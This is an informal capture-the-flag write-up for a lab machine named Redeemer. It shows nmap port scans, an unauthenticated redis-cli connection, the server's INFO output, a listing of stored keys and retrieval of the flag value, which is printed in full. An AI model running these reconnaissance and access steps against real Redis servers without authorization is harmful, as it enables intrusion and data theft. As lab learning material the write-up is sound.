
---

## Machine:
**Name:** Redeemer
**OS:** Linux 

---

## 1. Reconnaissance
nmap scan
```
❯ nmap -sC -sV 10.129.45.150
Starting Nmap 7.992 ( https://nmap.org ) at 2026-11-01 20:49 +0530
Nmap scan report for 10.129.45.150
Host is up (0.24s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE    SERVICE  VERSION
4444/tcp filtered krb524
6346/tcp filtered gnutella

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.85 seconds
```
service scan didnt find any open ports

trying a full port scan
```
sudo nmap -sS -p- -sV 10.129.45.150
Starting Nmap 7.992 ( https://nmap.org ) at 2026-11-01 21:35 +0530
Stats: 2:32:57 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 6.47% done; ETC: 13:00 (36:52:29 remaining)
```
aint no way, we try starting at like port 5k
```
❯ sudo nmap -sS -p- --min-rate 5000 10.129.45.150 -Pn
Starting Nmap 7.992 ( https://nmap.org ) at 2026-11-02 00:32 +0530
Nmap scan report for 10.129.45.150
Host is up (0.25s latency).
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE
6379/tcp open  redis

Nmap done: 1 IP address (1 host up) scanned in 15.62 seconds
```
type xi
port 6379/tcp is open running redis

---

%%had to reconnect to the machine cuz of some issue so the IP from here on will be 10.129.46.163%%
## 2. Enumeration

connecting to redis and ran info command

```
❯ redis-cli -h 10.129.46.163
10.129.46.163:6379> info
# Server
redis_version:5.0.7
redis_git_sha1:00000000
redis_git_dirty:0
redis_build_id:66bd629f924ac924
redis_mode:standalone
os:Linux 5.4.0-77-generic x86_64
arch_bits:64
multiplexing_api:epoll
atomicvar_api:atomic-builtin
gcc_version:9.3.0
process_id:749
run_id:fc3f87a65e9ed67fb0ee59ef468d4a07e4e1018c
tcp_port:6379
uptime_in_seconds:4135
uptime_in_days:0
hz:10
configured_hz:10
lru_clock:15179878
executable:/usr/bin/redis-server
config_file:/etc/redis/redis.conf

# Clients
connected_clients:1
client_recent_max_input_buffer:2
client_recent_max_output_buffer:0
blocked_clients:0

# Memory
used_memory:859624
used_memory_human:839.48K
used_memory_rss:5914624
used_memory_rss_human:5.64M
used_memory_peak:859624
used_memory_peak_human:839.48K
used_memory_peak_perc:100.00%
used_memory_overhead:846142
used_memory_startup:796224
used_memory_dataset:13482
used_memory_dataset_perc:21.26%
allocator_allocated:1514024
allocator_active:1875968
allocator_resident:11141120
total_system_memory:2084024320
total_system_memory_human:1.94G
used_memory_lua:41984
used_memory_lua_human:41.00K
used_memory_scripts:0
used_memory_scripts_human:0B
number_of_cached_scripts:0
maxmemory:0
maxmemory_human:0B
maxmemory_policy:noeviction
allocator_frag_ratio:1.24
allocator_frag_bytes:361944
allocator_rss_ratio:5.94
allocator_rss_bytes:9265152
rss_overhead_ratio:0.53
rss_overhead_bytes:-5226496
mem_fragmentation_ratio:7.23
mem_fragmentation_bytes:5097008
mem_not_counted_for_evict:0
mem_replication_backlog:0
mem_clients_slaves:0
mem_clients_normal:49694
mem_aof_buffer:0
mem_allocator:jemalloc-5.2.1
active_defrag_running:0
lazyfree_pending_objects:0

# Persistence
loading:0
rdb_changes_since_last_save:0
rdb_bgsave_in_progress:0
rdb_last_save_time:1793561540
rdb_last_bgsave_status:ok
rdb_last_bgsave_time_sec:0
rdb_current_bgsave_time_sec:-1
rdb_last_cow_size:413696
aof_enabled:0
aof_rewrite_in_progress:0
aof_rewrite_scheduled:0
aof_last_rewrite_time_sec:-1
aof_current_rewrite_time_sec:-1
aof_last_bgrewrite_status:ok
aof_last_write_status:ok
aof_last_cow_size:0

# Stats
total_connections_received:8
total_commands_processed:14
instantaneous_ops_per_sec:0
total_net_input_bytes:486
total_net_output_bytes:39467
instantaneous_input_kbps:0.00
instantaneous_output_kbps:0.00
rejected_connections:0
sync_full:0
sync_partial_ok:0
sync_partial_err:0
expired_keys:0
expired_stale_perc:0.00
expired_time_cap_reached_count:0
evicted_keys:0
keyspace_hits:0
keyspace_misses:0
pubsub_channels:0
pubsub_patterns:0
latest_fork_usec:232
migrate_cached_sockets:0
slave_expires_tracked_keys:0
active_defrag_hits:0
active_defrag_misses:0
active_defrag_key_hits:0
active_defrag_key_misses:0

# Replication
role:master
connected_slaves:0
master_replid:279f03e0df466be72e4a7f9f0a9edb18c30b1a5b
master_replid2:0000000000000000000000000000000000000000
master_repl_offset:0
second_repl_offset:-1
repl_backlog_active:0
repl_backlog_size:1048576
repl_backlog_first_byte_offset:0
repl_backlog_histlen:0

# CPU
used_cpu_sys:2.751486
used_cpu_user:2.442364
used_cpu_sys_children:0.000000
used_cpu_user_children:0.000969

# Cluster
cluster_enabled:0

# Keyspace
db0:keys=4,expires=0,avg_ttl=0
(1.36s)
```

can see that it has 4 keys stored in db0

---

## 3. Exploitation

select db0 and list da keys
```
10.129.46.163:6379> select 0
OK
10.129.46.163:6379> keys *
1) "numb"
2) "stor"
3) "flag"
4) "temp"
```

and there you hav it :d

```
10.129.46.163:6379> get flag
"03e1d2b376c37ab3f5319922053953eb"
```

---

## 4. Flag

```
03e1d2b376c37ab3f5319922053953eb
```


---

## Proof
![[redeemerproof.jpg]]